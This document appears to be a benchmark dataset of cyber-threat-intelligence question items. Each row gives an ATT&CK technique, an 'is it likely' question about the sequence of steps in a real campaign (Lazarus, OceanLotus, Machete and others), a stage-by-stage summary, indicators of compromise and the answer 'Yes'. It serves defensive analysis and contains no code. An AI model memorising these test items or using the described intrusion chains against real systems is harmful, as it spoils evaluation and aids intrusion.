2600,57,57-Command and Control-T1071-Application Layer Protocol,"After NanHaiShu gathers system information from infected machines, such as IP Address, Volume Serial Number, and Computer Name, is it likely to communicate with C&C servers using HTTP POST and HTTP GET before downloading and executing JScript and VBScript code?","Command and Control: NanHaiShu communicates with C&C servers using dynamic DNS providers. The malware uses HTTP POST to upload encoded system information and HTTP GET to download and execute JScript and VBScript code. The C&C servers initially resolved to IP addresses hosted in the United States but switched to a Chinese IP address on October 26th, 2015.","Initial Access: The threat actor behind NanHaiShu malware used spearphishing email messages as the infection vector to deliver the malware to targeted entities, including the Department of Justice of the Philippines, the organizers of the Asia-Pacific Economic Cooperation (APEC) Summit, and a major international law firm. The emails contained industry-specific terms and were crafted to appear legitimate to the recipients. The attached files, usually XLS or DOC, contained a VBA macro that executed an embedded JScript file. The attack relied on the targets having modified the default security setting in Microsoft Office to allow macro execution.
Execution: Upon enabling the malicious macro, NanHaiShu's VBA macro decodes and runs, writing JScript data to '%appdata%\Microsoft\Network\network.js' and executing it. The macro also decodes a decoy XLS file, saves it using the same filename as the malicious XLS, and loads the decoy. A VBScript file is created to delete the original file. The network.js file modifies the '%regrun%' registry to point to itself as its autostart mechanism.
Persistence: NanHaiShu establishes persistence by modifying the '%regrun%' registry entry to point to the network.js file, ensuring it starts automatically.
Defense Evasion: The malware uses base64 encoding to embed the decoy XLS and JScript file. For the recent sample, the URL string used inside the JScript code was obfuscated in two layers; it had to be decoded using base64, then decrypted using a routine that extracts and converts a Unicode number to a character.
Discovery: NanHaiShu gathers system information from the infected machine, including Volume Serial Number, IP Address, Computer Name, User Name, Operating System, and Proxy Server, and uploads it to the C&C server.
Exfiltration: The malware is capable of receiving and executing additional JScript and VBScript code, which can be used for exfiltration of data. The downloaded files or scripts may then be used to exfiltrate data that is likely to be highly sensitive, given the profile of its targets.
Others: The threat actor behind NanHaiShu is believed to be of Chinese origin, targeting entities involved in the South China Sea dispute. The malware's VBA base64 decoder function is associated with Chinese programmers, and the C&C servers pointed to a Chinese AS coinciding with news reports of US ship movements in the South China Sea. The malware is a Remote Access Trojan (RAT) capable of sending system information to a remote C&C server and executing additional code for potential data exfiltration.",Yes,nanhaishu_whitepaper
2602,57,57-Command and Control-T1132-Data Encoding,"After gathering system information from the infected machine, including Volume Serial Number, IP Address, Computer Name, User Name, Operating System, and Proxy Server, is NanHaiShu likely to communicate with C&C servers using dynamic DNS providers before using HTTP POST to upload encoded system information?","Command and Control: NanHaiShu communicates with C&C servers using dynamic DNS providers. The malware uses HTTP POST to upload encoded system information and HTTP GET to download and execute JScript and VBScript code. The C&C servers initially resolved to IP addresses hosted in the United States but switched to a Chinese IP address on October 26th, 2015.","Initial Access: The threat actor behind NanHaiShu malware used spearphishing email messages as the infection vector to deliver the malware to targeted entities, including the Department of Justice of the Philippines, the organizers of the Asia-Pacific Economic Cooperation (APEC) Summit, and a major international law firm. The emails contained industry-specific terms and were crafted to appear legitimate to the recipients. The attached files, usually XLS or DOC, contained a VBA macro that executed an embedded JScript file. The attack relied on the targets having modified the default security setting in Microsoft Office to allow macro execution.
Execution: Upon enabling the malicious macro, NanHaiShu's VBA macro decodes and runs, writing JScript data to '%appdata%\Microsoft\Network\network.js' and executing it. The macro also decodes a decoy XLS file, saves it using the same filename as the malicious XLS, and loads the decoy. A VBScript file is created to delete the original file. The network.js file modifies the '%regrun%' registry to point to itself as its autostart mechanism.
Persistence: NanHaiShu establishes persistence by modifying the '%regrun%' registry entry to point to the network.js file, ensuring it starts automatically.
Defense Evasion: The malware uses base64 encoding to embed the decoy XLS and JScript file. For the recent sample, the URL string used inside the JScript code was obfuscated in two layers; it had to be decoded using base64, then decrypted using a routine that extracts and converts a Unicode number to a character.
Discovery: NanHaiShu gathers system information from the infected machine, including Volume Serial Number, IP Address, Computer Name, User Name, Operating System, and Proxy Server, and uploads it to the C&C server.
Exfiltration: The malware is capable of receiving and executing additional JScript and VBScript code, which can be used for exfiltration of data. The downloaded files or scripts may then be used to exfiltrate data that is likely to be highly sensitive, given the profile of its targets.
Others: The threat actor behind NanHaiShu is believed to be of Chinese origin, targeting entities involved in the South China Sea dispute. The malware's VBA base64 decoder function is associated with Chinese programmers, and the C&C servers pointed to a Chinese AS coinciding with news reports of US ship movements in the South China Sea. The malware is a Remote Access Trojan (RAT) capable of sending system information to a remote C&C server and executing additional code for potential data exfiltration.",Yes,nanhaishu_whitepaper
2604,57,57-Persistence-T1547-Boot or Logon Autostart Execution,Is it likely that NanHaiShu's VBA macro will decode and execute JScript data by writing it to '%appdata%\Microsoft\Network\network.js' and executing it before establishing persistence by modifying the '%regrun%' registry entry to ensure the network.js file runs automatically?,"Persistence: NanHaiShu establishes persistence by modifying the '%regrun%' registry entry to point to the network.js file, ensuring it starts automatically.","Initial Access: The threat actor behind NanHaiShu malware used spearphishing email messages as the infection vector to deliver the malware to targeted entities, including the Department of Justice of the Philippines, the organizers of the Asia-Pacific Economic Cooperation (APEC) Summit, and a major international law firm. The emails contained industry-specific terms and were crafted to appear legitimate to the recipients. The attached files, usually XLS or DOC, contained a VBA macro that executed an embedded JScript file. The attack relied on the targets having modified the default security setting in Microsoft Office to allow macro execution.
Execution: Upon enabling the malicious macro, NanHaiShu's VBA macro decodes and runs, writing JScript data to '%appdata%\Microsoft\Network\network.js' and executing it. The macro also decodes a decoy XLS file, saves it using the same filename as the malicious XLS, and loads the decoy. A VBScript file is created to delete the original file. The network.js file modifies the '%regrun%' registry to point to itself as its autostart mechanism.
Defense Evasion: The malware uses base64 encoding to embed the decoy XLS and JScript file. For the recent sample, the URL string used inside the JScript code was obfuscated in two layers; it had to be decoded using base64, then decrypted using a routine that extracts and converts a Unicode number to a character.
Discovery: NanHaiShu gathers system information from the infected machine, including Volume Serial Number, IP Address, Computer Name, User Name, Operating System, and Proxy Server, and uploads it to the C&C server.
Command and Control: NanHaiShu communicates with C&C servers using dynamic DNS providers. The malware uses HTTP POST to upload encoded system information and HTTP GET to download and execute JScript and VBScript code. The C&C servers initially resolved to IP addresses hosted in the United States but switched to a Chinese IP address on October 26th, 2015.
Exfiltration: The malware is capable of receiving and executing additional JScript and VBScript code, which can be used for exfiltration of data. The downloaded files or scripts may then be used to exfiltrate data that is likely to be highly sensitive, given the profile of its targets.
Others: The threat actor behind NanHaiShu is believed to be of Chinese origin, targeting entities involved in the South China Sea dispute. The malware's VBA base64 decoder function is associated with Chinese programmers, and the C&C servers pointed to a Chinese AS coinciding with news reports of US ship movements in the South China Sea. The malware is a Remote Access Trojan (RAT) capable of sending system information to a remote C&C server and executing additional code for potential data exfiltration.",Yes,nanhaishu_whitepaper
2610,58,58-Privilege Escalation-T1053-Scheduled Task/Job,"After the Sednit group establishes a victim's machine as a valid target by delivering the Flash exploit ""flash_video_x86.swf"" via a spear-phishing email, is it likely that the group will use the resulting malware to utilize an unpatched Windows local privilege escalation exploit and enable persistence on the victim's machine?","Privilege Escalation: The Sednit group's malware utilizes an unpatched Windows local privilege escalation exploit, which was also part of the Hacking Team leak. This exploit allows the malware to execute with maximum privileges and is used to set persistence on the victim's machine through a scheduled task.","Initial Access: The Sednit espionage group, also known as APT28 or Fancy Bear, has been actively using a Flash exploit, identified as CVE-2015-5119, to target Eastern European institutions. This exploit was part of the Hacking Team data leak and allows attackers to execute arbitrary code remotely. The Sednit group's attack begins with a spear-phishing email containing a URL that mimics a legitimate domain, such as ""osce-press.org"". Upon visiting the URL, the victim's browser is directed to a landing page that collects detailed information about the computer. If the system meets the criteria set by the Sednit operators, the Flash exploit named ""flash_video_x86.swf"" is delivered. The exploit's decompiled code closely resembles the Hacking Team's version, with the main difference being the way the shellcode is received.
Persistence: If the Flash exploitation is successful, the victim's system receives a first-stage backdoor malware, which ensures the target is as intended. This malware includes the Hacking Team's Windows privilege escalation exploit. The Sednit group appears to have recompiled the source code of the exploit without altering its logic. Once the privilege escalation exploit is effective, the malware establishes persistence on the machine through a scheduled task that runs with the highest privileges.
Others: The Hacking Team data leak, which occurred over the weekend prior to July 10, 2015, involved more than 400GB of internal data, including business proposals and source code of the software sold by the company. The leaked data provided a complete exploitation chain for cyber attacks. ESET Research has urged users to upgrade their Flash software to mitigate the risks associated with these exploits. Indicators of Compromise (IoCs) have been identified, including the exploit kit domain name ""osce-press.org"", the Sednit Flash exploit with SHA1 hash D43FD6579AB8B9C40524CC8E4B7BD05BE6674F6C, the Sednit first-stage backdoor with SHA1 hash 51B0E3CD6360D50424BF776B3CD673DD45FD0F97, and the payload persistence script and file names ""fvecer.bat"" and ""api-ms-win-downlevel-profile-l1-1-0.dll"" with SHA1 hash B8B3F53CA2CD64BD101CB59C6553F6289A72D9BB.",Yes,Sednit APT Group Meets Hacking Team
2622,6,6-Command and Control-T1105-Ingress Tool Transfer,"After staging data in a temporary folder where files and logs from clipboard content, file copies, keystrokes, and screenshots were encrypted for collection, is it likely that Machete will use FTP and HTTP ports to download additional files for execution on the victim's machine before exfiltrating the encrypted and compressed browser profile data via the same channel used for command and control?","Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.","Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.
Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.
Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.
Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.
Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.
Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.",Yes,ESET_Machete
2668,63,63-Discovery-T1082-System Information Discovery,"After achieving persistence by creating a Launch Agent and copying itself to a location based on the user's UID in ~/Library/OpenSSL/ or /Library/TimeMachine/bin/mtmfs, is it likely that the OceanLotus backdoor will survey the victim's computer and send encrypted details about system information to its command and control server?","Discovery: The backdoor surveys the victim's computer and sends the information back to the server. It gathers details such as the victim's name, machine serial number, and system information, which is then encrypted and sent to the command and control server.","Initial Access: The OceanLotus backdoor is distributed via a zip file, presumed to be delivered through an email attachment. The zip file contains a directory with a file disguised as a Microsoft Word document icon, which is actually an application bundle containing executable code. When the user attempts to open the decoy Word document, the Trojan executes and displays a decoy document to mask its execution.
Execution: The OceanLotus backdoor, once executed, opens a hidden file named .CFUserEncoding, a password-protected Word document, from the application bundle's Resources folder. It also copies this file to the executable path, replacing the application bundle after persistence is established, leading the victim to believe they have opened a legitimate Word document.
Persistence: The backdoor creates a Launch Agent that runs when the victim's host starts up, differing from the previous version which executed upon user login. It copies itself to a location and filename based on the user's UID, using a segmented MD5 hash as a directory in ~/Library/OpenSSL/ or /Library/TimeMachine/bin/mtmfs for root users. The malware then deletes the original application bundle, leaving the decoy document, and launches itself as a service from the new location.
Defense Evasion: The backdoor avoids the use of command line utilities and suspicious strings, showing a deep understanding of macOS. It employs a robust string encoding mechanism to obfuscate its functions, making it less suspicious to static analysis. The malware also uses a custom binary protocol with encryption to communicate with its command and control server, an improvement over the previous version's simple XOR encoding.
Command and Control: The backdoor communicates with the command and control server using a custom binary protocol on TCP port 443. The communication sequence involves initiating a session, receiving an ephemeral encryption key and command from the server, executing the command, and sending back the results encrypted with AES in CBC mode. The server uses ephemeral keys for each session, enhancing the security of the communication.
Others: The OceanLotus backdoor is an advanced threat targeting victims in Vietnam with low AV detection. It has been active for over a year with recent communication with the command and control server as of early June 2017. The backdoor includes improvements such as a decoy document, custom binary protocol traffic with encryption, and a modularized structure. Apple has updated macOS protection systems to address this variant, and Palo Alto Networks customers are protected with classified samples, malicious domain and IP classifications, and IPS signatures. Indicators of compromise include various hashes, C2 server domains, and dropped files with specific paths based on the user's UID.",Yes,unit42-new-improved-macos-backdoor-oceanlotus
2670,63,63-Command and Control-T1104-Multi-Stage Channels,"After OceanLotus achieves persistence by creating a Launch Agent and launching itself as a service from a new location, is it likely that the backdoor will gather system details and send the information back to its command and control server using a custom binary protocol with session-based ephemeral keys?","Command and Control: The backdoor communicates with the command and control server using a custom binary protocol on TCP port 443. The communication sequence involves initiating a session, receiving an ephemeral encryption key and command from the server, executing the command, and sending back the results encrypted with AES in CBC mode. The server uses ephemeral keys for each session, enhancing the security of the communication.","Initial Access: The OceanLotus backdoor is distributed via a zip file, presumed to be delivered through an email attachment. The zip file contains a directory with a file disguised as a Microsoft Word document icon, which is actually an application bundle containing executable code. When the user attempts to open the decoy Word document, the Trojan executes and displays a decoy document to mask its execution.
Execution: The OceanLotus backdoor, once executed, opens a hidden file named .CFUserEncoding, a password-protected Word document, from the application bundle's Resources folder. It also copies this file to the executable path, replacing the application bundle after persistence is established, leading the victim to believe they have opened a legitimate Word document.
Persistence: The backdoor creates a Launch Agent that runs when the victim's host starts up, differing from the previous version which executed upon user login. It copies itself to a location and filename based on the user's UID, using a segmented MD5 hash as a directory in ~/Library/OpenSSL/ or /Library/TimeMachine/bin/mtmfs for root users. The malware then deletes the original application bundle, leaving the decoy document, and launches itself as a service from the new location.
Defense Evasion: The backdoor avoids the use of command line utilities and suspicious strings, showing a deep understanding of macOS. It employs a robust string encoding mechanism to obfuscate its functions, making it less suspicious to static analysis. The malware also uses a custom binary protocol with encryption to communicate with its command and control server, an improvement over the previous version's simple XOR encoding.
Discovery: The backdoor surveys the victim's computer and sends the information back to the server. It gathers details such as the victim's name, machine serial number, and system information, which is then encrypted and sent to the command and control server.
Others: The OceanLotus backdoor is an advanced threat targeting victims in Vietnam with low AV detection. It has been active for over a year with recent communication with the command and control server as of early June 2017. The backdoor includes improvements such as a decoy document, custom binary protocol traffic with encryption, and a modularized structure. Apple has updated macOS protection systems to address this variant, and Palo Alto Networks customers are protected with classified samples, malicious domain and IP classifications, and IPS signatures. Indicators of compromise include various hashes, C2 server domains, and dropped files with specific paths based on the user's UID.",Yes,unit42-new-improved-macos-backdoor-oceanlotus
2671,63,63-Persistence-T1543-Create or Modify System Process,"After executing a hidden file from the application bundle’s Resources folder to display a decoy document, is it likely that the OceanLotus backdoor will create a Launch Agent, copy itself to a new location based on the user's UID, delete the original application bundle, and launch itself as a service for persistence before surveying the victim's computer to send system information to its command and control server?","Persistence: The backdoor creates a Launch Agent that runs when the victim's host starts up, differing from the previous version which executed upon user login. It copies itself to a location and filename based on the user's UID, using a segmented MD5 hash as a directory in ~/Library/OpenSSL/ or /Library/TimeMachine/bin/mtmfs for root users. The malware then deletes the original application bundle, leaving the decoy document, and launches itself as a service from the new location.","Initial Access: The OceanLotus backdoor is distributed via a zip file, presumed to be delivered through an email attachment. The zip file contains a directory with a file disguised as a Microsoft Word document icon, which is actually an application bundle containing executable code. When the user attempts to open the decoy Word document, the Trojan executes and displays a decoy document to mask its execution.
Execution: The OceanLotus backdoor, once executed, opens a hidden file named .CFUserEncoding, a password-protected Word document, from the application bundle's Resources folder. It also copies this file to the executable path, replacing the application bundle after persistence is established, leading the victim to believe they have opened a legitimate Word document.
Defense Evasion: The backdoor avoids the use of command line utilities and suspicious strings, showing a deep understanding of macOS. It employs a robust string encoding mechanism to obfuscate its functions, making it less suspicious to static analysis. The malware also uses a custom binary protocol with encryption to communicate with its command and control server, an improvement over the previous version's simple XOR encoding.
Discovery: The backdoor surveys the victim's computer and sends the information back to the server. It gathers details such as the victim's name, machine serial number, and system information, which is then encrypted and sent to the command and control server.
Command and Control: The backdoor communicates with the command and control server using a custom binary protocol on TCP port 443. The communication sequence involves initiating a session, receiving an ephemeral encryption key and command from the server, executing the command, and sending back the results encrypted with AES in CBC mode. The server uses ephemeral keys for each session, enhancing the security of the communication.
Others: The OceanLotus backdoor is an advanced threat targeting victims in Vietnam with low AV detection. It has been active for over a year with recent communication with the command and control server as of early June 2017. The backdoor includes improvements such as a decoy document, custom binary protocol traffic with encryption, and a modularized structure. Apple has updated macOS protection systems to address this variant, and Palo Alto Networks customers are protected with classified samples, malicious domain and IP classifications, and IPS signatures. Indicators of compromise include various hashes, C2 server domains, and dropped files with specific paths based on the user's UID.",Yes,unit42-new-improved-macos-backdoor-oceanlotus
2676,64,64-Defense Evasion-T1205-Traffic Signaling,"After ZoxPNG begins communication with the victim's machine via the WinInet API to exploit proxy settings for defense evasion, is it likely to establish contact with the C2 server through an initial HTTP GET request for command and control?","Defense Evasion: ZoxPNG uses the WinInet API for HTTP communication, which allows it to automatically use proxy settings configured on the victim's machine. It sends a VictimSystemData structure in the HTTP Cookie header, which includes a checksum of the victim's computer name to detect corrupt or forged requests. The communication pattern includes HTTP GET and POST requests with a PNG file containing instructions or data.","Execution: ZoxPNG is a simple RAT that uses the PNG image file format for data transmission with the C2 server. It supports 13 native commands and can execute arbitrary code from the C2 server. ZoxPNG requires the attacker to specify the C2 server address as a command line argument. Upon activation, it registers command handlers and enters a loop for communication and command dispatch, attempting to reconnect to the C2 server after any communication failures.
Command and Control: ZoxPNG communicates with the C2 server using HTTP requests, with the first GET request establishing initial contact. Subsequent requests may use GET or POST, depending on whether data needs to be sent to the C2 server. The C2 server responds with a PNG file containing the next instruction. ZoxPNG is resilient to network instability, retrying connections multiple times with delays.
Others: ZoxPNG's communication with the C2 server is based on a polling model, with the binary attempting to contact the C2 server up to five times with 5-second intervals between attempts. The communication subsystem uses standard Base64 encoding to transfer data without NULL byte issues. The PNG file format is used for data transmission, adhering to the PNG standard to reduce detectability. ZoxPNG can be detected over the network by looking for a specific static string in the traffic. On disk, the same string can be used for detection with a YARA signature. Known samples of ZoxPNG have been identified, with some signed using a certificate from '4NB Corp.' The malware has evolved from an earlier variant known as ZoxRPC, which targeted specific regional versions of Windows and used the MS08-067 vulnerability.",Yes,ZoxPNG_Full_Analysis-Final
2681,65,65-Impact-T1499-Endpoint Denial of Service,"After periodically communicating with its C&C server using encoded port numbers and hard-coded IP addresses, is it likely that KiraV2 will perform various types of DDoS attacks to disrupt the availability of targeted services and infrastructure?","Impact: KiraV2's primary impact is through DDoS attacks. It supports various types of DDoS attacks, such as UDP flooding and TCP ACK flooding, to disrupt the availability of targeted services and infrastructure.","Initial Access: The CTI report details a new Mirai variant, KiraV2, which exploits vulnerabilities in IoT devices for initial access. It targets devices such as MVPower DVR with JAWS Web Server and Huawei routers by leveraging a remote code execution vulnerability. KiraV2 also retains Mirai's method of using telnet brute-force attacks to compromise devices with weak credentials.
Execution: KiraV2 malware, an enhanced version of Mirai, executes various DDoS attacks and distributes itself to vulnerable IoT devices. It uses encoded strings for C&C server communication and employs anti-analysis techniques like changing process names and encoding strings to disrupt analysis. The malware also ensures standalone execution by binding to a local port and confirming normal execution by printing a designated string.
Persistence: KiraV2 employs techniques to prevent system reboots and maintain its presence on infected devices. It deactivates watchdog features on multiple device paths to avoid system resets and periodically resets the watchdog timer to keep the device alive.
Defense Evasion: KiraV2 uses anti-analysis techniques such as encoding strings and changing process names to evade detection. It also employs a signal handler registration method to hide the real C&C server address from analysis.
Credential Access: KiraV2 conducts telnet dictionary attacks using a list of common credentials to gain unauthorized access to IoT devices. It targets environments where telnet is installed and busybox is present, indicating a focus on devices with weak telnet account information.
Command and Control: KiraV2 communicates with a C&C server using hard-coded IP addresses and encoded port numbers. It periodically communicates with the C&C server to receive commands and execute DDoS attacks.
Others: The report emphasizes the importance of changing default device credentials and updating IoT devices to the latest versions to prevent vulnerability exploitation. AhnLab's anti-malware product, AhnLab V3, detects Mirai malware under the alias Worm/Linux.Mirai.SE189.",Yes,ASEC_REPORT_vol.100_ENG
2693,66,66-Credential Access-T1003-OS Credential Dumping,"Before deploying DarkComet with a credential dumping tool to extract credentials, is it likely that Elfin will bypass logging on the infected machine using PowerShell commands as part of their defense evasion tactics, and then proceed with command and control communications using tools like POSHC2 and Quasar RAT after extracting credentials?","Credential Access: Elfin deployed DarkComet, which included a credential dumping tool, to extract credentials from the compromised system.","Reconnaissance: The Elfin espionage group, also known as APT33, has been actively scanning for vulnerable websites to identify potential targets for attacks or to create command and control (C&C) infrastructure. This activity has been ongoing since the group first became active in late 2015 or early 2016.
Initial Access: Elfin attempted to exploit a known vulnerability (CVE-2018-20250) in WinRAR during February 2019 against a target in the chemical sector in Saudi Arabia. The exploit, delivered likely via spear-phishing, could permit code execution on unpatched computers. Symantec's proactive protection (Exp.CVE-2018-20250) prevented the targeted organization from being compromised.
Execution: Elfin has deployed a wide range of tools in its attacks, including custom malware such as Notestuk (Backdoor.Notestuk), Stonedrill (Trojan.Stonedrill), and an AutoIt backdoor, as well as commodity malware like Remcos (Backdoor.Remvio), DarkComet (Backdoor.Breut), Quasar RAT (Trojan.Quasar), Pupy RAT (Backdoor.Patpoopy), NanoCore (Trojan.Nancrat), and NetWeird (Trojan.Netweird.B).
Persistence: In a detailed case study of an attack on a U.S. organization, Elfin created a scheduled task to execute a malicious VBE file multiple times a day, ensuring persistence on the compromised system.
Defense Evasion: Elfin used PowerShell commands to bypass logging on the infected machine, as part of their defense evasion tactics. They also deployed various versions of DarkComet, POSHC2 implants, and an AutoIt backdoor, along with further credential dumping activities.
Command and Control: Elfin used POSHC2, a proxy-aware C&C framework, to communicate with the compromised systems. They also used Quasar RAT and other tools to maintain control over the infected computers.
Exfiltration: Elfin exfiltrated data using a custom .NET FTP tool and a custom AutoIt FTP exfiltration tool known as FastUploader, designed to exfiltrate data at a faster rate than traditional FTP clients.
Others: Symantec has provided file-based protection against Elfin's tools and techniques, as well as threat intelligence through the DeepSight Intelligence Managed Adversary and Threat Intelligence (MATI) service. The Attack Investigation Team within Symantec Security Response is dedicated to investigating targeted attacks and enhancing protection in Symantec products.",Yes,Elfin Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and US
2728,7,7-Discovery-T1083-File and Directory Discovery,"After utilizing the Responder tool to harvest credentials during credential access, is the Lazarus group likely to conduct discovery activities such as file and directory discovery before achieving lateral movement using WMIC and compromised routers to bypass network segmentation?","Discovery: The group conducted discovery activities such as network share, process, system network configuration, system owner/user, system network connections, system information, file and directory, and system service discovery.","Reconnaissance: The Lazarus group conducted reconnaissance by using spear-phishing emails embellished with personal information gathered from publicly available sources. The emails targeted various departments within the defense industry, claiming to have urgent updates on COVID-19. The attackers registered email accounts that resembled the medical center's real email addresses and included the actual personal data of the deputy head doctor in the signature. The phishing emails contained a malicious Word document designed to download and execute additional malware.
Initial Access: The initial access was achieved through spear-phishing emails containing malicious Word documents. The documents, which were unrelated to COVID-19, contained macros that, when enabled, would download and execute additional malware. The attackers sent follow-up emails instructing recipients on how to enable macros. The infection was successful when an employee opened one of the attachments, allowing the attackers to gain remote control of the infected system.
Execution: The malware, known as ThreatNeedle, was executed in a multistage deployment procedure. It began with a spear-phishing document that loaded the next stage as a backdoor running in-memory. The ThreatNeedle backdoor was used for initial reconnaissance and to deploy additional malware for lateral movement.
Persistence: The ThreatNeedle installer-type malware was responsible for implanting the next stage loader-type malware and registering it for auto-execution to achieve persistence. The loader-type malware existed in several variations and served the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.
Defense Evasion: The Lazarus group utilized various techniques to evade detection, including deleting log files from the router and using a custom web shell script. They also employed masquerading techniques, such as renaming system utilities and modifying registry keys to hide their activities.
Credential Access: The group executed a credential harvesting tool named Responder from one of the victim machines to acquire login credentials, which were then used for lateral movement.
Lateral Movement: Lateral movement was achieved using Windows commands and the Windows Management Instrumentation Command-line (WMIC) to establish network connections and copy malware to remote hosts. The attackers also compromised a router virtual machine to overcome network segmentation and access the restricted network segment.
Collection: The group archived collected data using utilities to prepare for exfiltration.
Command and Control: The command-and-control infrastructure involved multiple servers for various stages, with the attackers configuring the Apache web server on a compromised router to use it as a proxy server between the organization's corporate and restricted segments.
Exfiltration: Data exfiltration was performed using a custom tunneling tool with a custom encryption routine to create a covert channel. The group also used a Trojanized VNC Uploader to upload data to the C2 server via HTTP POST requests.
Others: The Lazarus group's campaign against the defense industry was attributed to their use of the ThreatNeedle malware cluster, which is an advanced version of Manuscrypt (a.k.a. NukeSped). The group demonstrated its ability to circumvent security measures such as network segmentation. Connections were found between this campaign and other Lazarus group campaigns, including DeathNote, Operation AppleJeus, and Bookcode.",Yes,kaspersky-ics-cert-lazarus-targets-defense-industry-with-threatneedle-en-20210225
2730,7,7-Collection-T1560-Archive Collected Data,"After utilizing Windows commands and the Windows Management Instrumentation Command-line (WMIC) to establish network connections for lateral movement, is the Lazarus group likely to archive collected data using utilities before exfiltrating it through a covert channel created by a custom tunneling tool?",Collection: The group archived collected data using utilities to prepare for exfiltration.,"Reconnaissance: The Lazarus group conducted reconnaissance by using spear-phishing emails embellished with personal information gathered from publicly available sources. The emails targeted various departments within the defense industry, claiming to have urgent updates on COVID-19. The attackers registered email accounts that resembled the medical center's real email addresses and included the actual personal data of the deputy head doctor in the signature. The phishing emails contained a malicious Word document designed to download and execute additional malware.
Initial Access: The initial access was achieved through spear-phishing emails containing malicious Word documents. The documents, which were unrelated to COVID-19, contained macros that, when enabled, would download and execute additional malware. The attackers sent follow-up emails instructing recipients on how to enable macros. The infection was successful when an employee opened one of the attachments, allowing the attackers to gain remote control of the infected system.
Execution: The malware, known as ThreatNeedle, was executed in a multistage deployment procedure. It began with a spear-phishing document that loaded the next stage as a backdoor running in-memory. The ThreatNeedle backdoor was used for initial reconnaissance and to deploy additional malware for lateral movement.
Persistence: The ThreatNeedle installer-type malware was responsible for implanting the next stage loader-type malware and registering it for auto-execution to achieve persistence. The loader-type malware existed in several variations and served the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.
Defense Evasion: The Lazarus group utilized various techniques to evade detection, including deleting log files from the router and using a custom web shell script. They also employed masquerading techniques, such as renaming system utilities and modifying registry keys to hide their activities.
Credential Access: The group executed a credential harvesting tool named Responder from one of the victim machines to acquire login credentials, which were then used for lateral movement.
Discovery: The group conducted discovery activities such as network share, process, system network configuration, system owner/user, system network connections, system information, file and directory, and system service discovery.
Lateral Movement: Lateral movement was achieved using Windows commands and the Windows Management Instrumentation Command-line (WMIC) to establish network connections and copy malware to remote hosts. The attackers also compromised a router virtual machine to overcome network segmentation and access the restricted network segment.
Command and Control: The command-and-control infrastructure involved multiple servers for various stages, with the attackers configuring the Apache web server on a compromised router to use it as a proxy server between the organization's corporate and restricted segments.
Exfiltration: Data exfiltration was performed using a custom tunneling tool with a custom encryption routine to create a covert channel. The group also used a Trojanized VNC Uploader to upload data to the C2 server via HTTP POST requests.
Others: The Lazarus group's campaign against the defense industry was attributed to their use of the ThreatNeedle malware cluster, which is an advanced version of Manuscrypt (a.k.a. NukeSped). The group demonstrated its ability to circumvent security measures such as network segmentation. Connections were found between this campaign and other Lazarus group campaigns, including DeathNote, Operation AppleJeus, and Bookcode.",Yes,kaspersky-ics-cert-lazarus-targets-defense-industry-with-threatneedle-en-20210225
2749,72,72-Exfiltration-T1041-Exfiltration Over C2 Channel,"After the malware communicates with the command center at the IP address 192.169.82.86 to deliver collected information during the Command and Control phase, is it likely that data exfiltration via HTTP GET posts or email messages targeting the same IP address or compromised organizations will occur in the Exfiltration phase?",Exfiltration: Data exfiltration was primarily conducted via HTTP GET posts sent to the IP address 192.169.82.86 and email messages sent to addresses associated with compromised organizations operating in manufacturing and technology services.,"Reconnaissance: The attackers initiated their campaign by sending spear phishing emails to senior members and executives of targeted organizations, aiming to lure them with what appeared to be payment documents from a bank in the UAE, Emirates NBD. These emails contained compressed executables or phishing links, with fake sources used to deliver the emails to victims.
Resource Development: The malware used in the attacks, based on the Hawkeye commercial spyware, was designed to collect a variety of data from the victim's device, including passwords, keystrokes, and screenshots. This commercial off-the-shelf malware provided anonymity for the attackers, making attribution more difficult.
Initial Access: The initial access to the victim's network was achieved through spear phishing emails that included a 7z file with a malware executable disguised as a payment instruction document. The emails targeted senior members and executives within the organizations.
Execution: Upon execution, the malware self-deployed and configured persistence using anti-debugging and timeout techniques. It then began collecting data from the victim's device, such as keystrokes, clipboard data, and account data from various applications and clients.
Persistence: The malware established persistence on the victim's device to maintain access and continue its data collection activities.
Defense Evasion: The malware employed anti-debugging and timeout techniques to evade detection and maintain its presence on the victim's device.
Credential Access: The malware collected a variety of sensitive information, including FileZilla FTP server credentials, account data from local browsers, messaging clients, email clients, and license information of some installed applications.
Collection: The malware collected data such as keystrokes, clipboard data, and account information from various sources on the victim's device.
Command and Control: The malware communicated with a command center at the IP address 192.169.82.86 to deliver collected information, which included passwords, clipboard data, and screenshots. The IP address appeared to belong to a compromised device running multiple malware campaigns.
